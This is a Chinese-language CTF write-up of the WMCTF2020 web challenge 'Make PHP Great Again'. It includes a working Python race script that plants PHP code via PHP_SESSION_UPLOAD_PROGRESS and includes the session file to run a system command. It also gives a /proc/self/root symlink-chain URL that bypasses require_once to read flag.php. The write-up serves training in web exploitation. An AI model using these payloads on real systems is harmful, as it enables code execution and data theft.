# [WMCTF2020]Make PHP Great Again



## 前言

突然想到今年WMCTF2021 赵总出的那道Web还没去复现，就打算复现一波，然后又想到去年的Make PHP Great Again也还没复现，就先来buuctf上面复现一下这个题目。



## 非预期

没啥好说的了，文件包含，PHP_SESSION_UPLOAD_PROGRESS万能非预期：

```php
import io
import sys
import requests
import threading

host = 'http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/'
sessid = 'feng'

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            host,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('cat flag.php');echo md5('1');?>"},
            files={"file":('a.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def READ(session):
    while True:
        response = session.get(f'{host}?file=/tmp/sess_{sessid}')
        # print(response.text)
        if 'c4ca4238a0b923820dcc509a6f75849b' not in response.text:
            print('[+++]retry')
        else:
            print(response.text)
            sys.exit(0)


with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()
    READ(session)
```



## 预期解

官方wp这样说的：

> PHP最新版 的小 Trick， require_once 包含的软链接层数较多事 once 的 hash 匹配会直接失效造成重复包含。



`/proc/self/`是指向当前进程的`/proc/pid/`，而`/proc/self/root`是指向`/`的软连接，所以让软连接层数变多即可造成重复包含：

```
http://a4b822a9-e181-4395-b9be-014a4acc375e.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

